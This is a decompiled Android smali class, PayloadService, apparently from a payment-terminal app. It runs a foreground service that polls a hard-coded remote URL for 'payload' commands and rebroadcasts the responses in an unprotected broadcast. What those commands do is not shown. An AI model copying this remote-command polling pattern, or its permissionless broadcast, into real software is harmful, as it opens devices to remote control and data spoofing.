.class public final Lcom/roder300/kozen/PayloadService;
.super Landroid/app/Service;
.source "PayloadService.kt"


# annotations
.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000A\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\u000e\n\u0000\n\u0002\u0008\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0008\n\u0002\u0008\u0003\n\u0002\u0010\u0002\n\u0002\u0008\u0008*\u0001\u000b\u0008\u0007\u0018\u00002\u00020\u0001B\u0007\u00a2\u0006\u0004\u0008\u0002\u0010\u0003J\u0014\u0010\r\u001a\u0004\u0018\u00010\u000e2\u0008\u0010\u000f\u001a\u0004\u0018\u00010\u0010H\u0016J\"\u0010\u0011\u001a\u00020\u00122\u0008\u0010\u000f\u001a\u0004\u0018\u00010\u00102\u0006\u0010\u0013\u001a\u00020\u00122\u0006\u0010\u0014\u001a\u00020\u0012H\u0016J\u0008\u0010\u0015\u001a\u00020\u0016H\u0016J\u0008\u0010\u0017\u001a\u00020\u0016H\u0002J\u0008\u0010\u0018\u001a\u00020\u0016H\u0002J\u0008\u0010\u0019\u001a\u00020\u0016H\u0002J\u0008\u0010\u001a\u001a\u00020\u0016H\u0002J\u0018\u0010\u001b\u001a\u00020\u00162\u0006\u0010\u001c\u001a\u00020\t2\u0006\u0010\u001d\u001a\u00020\tH\u0002R\u000e\u0010\u0004\u001a\u00020\u0005X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0007X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0008\u001a\u00020\tX\u0082D\u00a2\u0006\u0002\n\u0000R\u0010\u0010\n\u001a\u00020\u000bX\u0082\u0004\u00a2\u0006\u0004\n\u0002\u0010\u000c\u00a8\u0006\u001e"
    }
    d2 = {
        "Lcom/roder300/kozen/PayloadService;",
        "Landroid/app/Service;",
        "<init>",
        "()V",
        "handler",
        "Landroid/os/Handler;",
        "isChecking",
        "",
        "PAYLOAD_URL",
        "",
        "payloadCheckRunnable",
        "com/roder300/kozen/PayloadService$payloadCheckRunnable$1",
        "Lcom/roder300/kozen/PayloadService$payloadCheckRunnable$1;",
        "onBind",
        "Landroid/os/IBinder;",
        "intent",
        "Landroid/content/Intent;",
        "onStartCommand",
        "",
        "flags",
        "startId",
        "onDestroy",
        "",
        "startForegroundService",
        "startPayloadChecking",
        "stopPayloadChecking",
        "checkPayload",
        "sendPayloadBroadcast",
        "state",
        "data",
        "app_debug"
    }
    k = 0x1
    mv = {
        0x2,
        0x0,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I


# instance fields
.field private final PAYLOAD_URL:Ljava/lang/String;

.field private final handler:Landroid/os/Handler;

.field private isChecking:Z

.field private final payloadCheckRunnable:Lcom/roder300/kozen/PayloadService$payloadCheckRunnable$1;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/16 v0, 0x8

    sput v0, Lcom/roder300/kozen/PayloadService;->$stable:I

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .line 13
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 15
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/roder300/kozen/PayloadService;->handler:Landroid/os/Handler;

    .line 17
    const-string v0, "https://sberpos-api.onrender.com/api/payload"

    iput-object v0, p0, Lcom/roder300/kozen/PayloadService;->PAYLOAD_URL:Ljava/lang/String;

    .line 19
    new-instance v0, Lcom/roder300/kozen/PayloadService$payloadCheckRunnable$1;

    invoke-direct {v0, p0}, Lcom/roder300/kozen/PayloadService$payloadCheckRunnable$1;-><init>(Lcom/roder300/kozen/PayloadService;)V

    iput-object v0, p0, Lcom/roder300/kozen/PayloadService;->payloadCheckRunnable:Lcom/roder300/kozen/PayloadService$payloadCheckRunnable$1;

    .line 13
    return-void
.end method

.method public static final synthetic access$checkPayload(Lcom/roder300/kozen/PayloadService;)V
    .locals 0
    .param p0, "$this"    # Lcom/roder300/kozen/PayloadService;

    .line 13
    invoke-direct {p0}, Lcom/roder300/kozen/PayloadService;->checkPayload()V

    return-void
.end method

.method public static final synthetic access$getHandler$p(Lcom/roder300/kozen/PayloadService;)Landroid/os/Handler;
    .locals 1
    .param p0, "$this"    # Lcom/roder300/kozen/PayloadService;

    .line 13
    iget-object v0, p0, Lcom/roder300/kozen/PayloadService;->handler:Landroid/os/Handler;

    return-object v0
.end method

.method public static final synthetic access$isChecking$p(Lcom/roder300/kozen/PayloadService;)Z
    .locals 1
    .param p0, "$this"    # Lcom/roder300/kozen/PayloadService;

    .line 13
    iget-boolean v0, p0, Lcom/roder300/kozen/PayloadService;->isChecking:Z

    return v0
.end method

.method public static final synthetic access$sendPayloadBroadcast(Lcom/roder300/kozen/PayloadService;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p0, "$this"    # Lcom/roder300/kozen/PayloadService;
    .param p1, "state"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;

    .line 13
    invoke-direct {p0, p1, p2}, Lcom/roder300/kozen/PayloadService;->sendPayloadBroadcast(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private final checkPayload()V
    .locals 4

    .line 76
    new-instance v0, Lokhttp3/OkHttpClient$Builder;

    invoke-direct {v0}, Lokhttp3/OkHttpClient$Builder;-><init>()V

    .line 77
    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x5

    invoke-virtual {v0, v2, v3, v1}, Lokhttp3/OkHttpClient$Builder;->connectTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    .line 78
    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v0, v2, v3, v1}, Lokhttp3/OkHttpClient$Builder;->readTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    .line 79
    invoke-virtual {v0}, Lokhttp3/OkHttpClient$Builder;->build()Lokhttp3/OkHttpClient;

    move-result-object v0

    .line 76
    nop

    .line 81
    .local v0, "client":Lokhttp3/OkHttpClient;
    new-instance v1, Lokhttp3/Request$Builder;

    invoke-direct {v1}, Lokhttp3/Request$Builder;-><init>()V

    .line 82
    iget-object v2, p0, Lcom/roder300/kozen/PayloadService;->PAYLOAD_URL:Ljava/lang/String;

    invoke-virtual {v1, v2}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v1

    .line 83
    invoke-virtual {v1}, Lokhttp3/Request$Builder;->get()Lokhttp3/Request$Builder;

    move-result-object v1

    .line 84
    const-string v2, "Content-Type"

    const-string v3, "application/json"

    invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v1

    .line 85
    invoke-virtual {v1}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v1

    .line 81
    nop

    .line 87
    .local v1, "request":Lokhttp3/Request;
    invoke-virtual {v0, v1}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v2

    new-instance v3, Lcom/roder300/kozen/PayloadService$checkPayload$1;

    invoke-direct {v3, p0}, Lcom/roder300/kozen/PayloadService$checkPayload$1;-><init>(Lcom/roder300/kozen/PayloadService;)V

    check-cast v3, Lokhttp3/Callback;

    invoke-interface {v2, v3}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    .line 107
    return-void
.end method

.method private final sendPayloadBroadcast(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "state"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;

    .line 110
    new-instance v0, Landroid/content/Intent;

    const-string v1, "com.roder300.kozen.PAYLOAD_UPDATE"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 111
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "state"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 112
    const-string v1, "data"

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 113
    invoke-virtual {p0, v0}, Lcom/roder300/kozen/PayloadService;->sendBroadcast(Landroid/content/Intent;)V

    .line 114
    return-void
.end method

.method private final startForegroundService()V
    .locals 4

    .line 42
    const-string v0, "payload_channel"

    .line 43
    .local v0, "channelId":Ljava/lang/String;
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    .line 44
    new-instance v1, Landroid/app/NotificationChannel;

    .line 45
    nop

    .line 46
    const-string v2, "Payload Checker"

    check-cast v2, Ljava/lang/CharSequence;

    .line 47
    nop

    .line 44
    const/4 v3, 0x2

    invoke-direct {v1, v0, v2, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 49
    .local v1, "channel":Landroid/app/NotificationChannel;
    const-class v2, Landroid/app/NotificationManager;

    invoke-virtual {p0, v2}, Lcom/roder300/kozen/PayloadService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/NotificationManager;

    .line 50
    .local v2, "manager":Landroid/app/NotificationManager;
    invoke-virtual {v2, v1}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 53
    .end local v1    # "channel":Landroid/app/NotificationChannel;
    .end local v2    # "manager":Landroid/app/NotificationManager;
    :cond_0
    new-instance v1, Landroidx/core/app/NotificationCompat$Builder;

    move-object v2, p0

    check-cast v2, Landroid/content/Context;

    invoke-direct {v1, v2, v0}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 54
    const-string v2, "Kozen App"

    check-cast v2, Ljava/lang/CharSequence;

    invoke-virtual {v1, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 55
    const-string v2, "\u041c\u043e\u043d\u0438\u0442\u043e\u0440\u0438\u043d\u0433 \u043a\u043e\u043c\u0430\u043d\u0434"

    check-cast v2, Ljava/lang/CharSequence;

    invoke-virtual {v1, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 56
    sget v2, Lcom/roder300/kozen/R$mipmap;->ic_launcher:I

    invoke-virtual {v1, v2}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 57
    const/4 v2, -0x1

    invoke-virtual {v1, v2}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 58
    invoke-virtual {v1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    const-string v2, "build(...)"

    invoke-static {v1, v2}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 53
    nop

    .line 60
    .local v1, "notification":Landroid/app/Notification;
    const/4 v2, 0x1

    invoke-virtual {p0, v2, v1}, Lcom/roder300/kozen/PayloadService;->startForeground(ILandroid/app/Notification;)V

    .line 61
    return-void
.end method

.method private final startPayloadChecking()V
    .locals 2

    .line 64
    iget-boolean v0, p0, Lcom/roder300/kozen/PayloadService;->isChecking:Z

    if-nez v0, :cond_0

    .line 65
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/roder300/kozen/PayloadService;->isChecking:Z

    .line 66
    iget-object v0, p0, Lcom/roder300/kozen/PayloadService;->handler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/roder300/kozen/PayloadService;->payloadCheckRunnable:Lcom/roder300/kozen/PayloadService$payloadCheckRunnable$1;

    check-cast v1, Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 68
    :cond_0
    return-void
.end method

.method private final stopPayloadChecking()V
    .locals 2

    .line 71
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/roder300/kozen/PayloadService;->isChecking:Z

    .line 72
    iget-object v0, p0, Lcom/roder300/kozen/PayloadService;->handler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/roder300/kozen/PayloadService;->payloadCheckRunnable:Lcom/roder300/kozen/PayloadService$payloadCheckRunnable$1;

    check-cast v1, Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 73
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 28
    const/4 v0, 0x0

    return-object v0
.end method

.method public onDestroy()V
    .locals 0

    .line 37
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 38
    invoke-direct {p0}, Lcom/roder300/kozen/PayloadService;->stopPayloadChecking()V

    .line 39
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .line 31
    invoke-direct {p0}, Lcom/roder300/kozen/PayloadService;->startForegroundService()V

    .line 32
    invoke-direct {p0}, Lcom/roder300/kozen/PayloadService;->startPayloadChecking()V

    .line 33
    const/4 v0, 0x1

    return v0
.end method
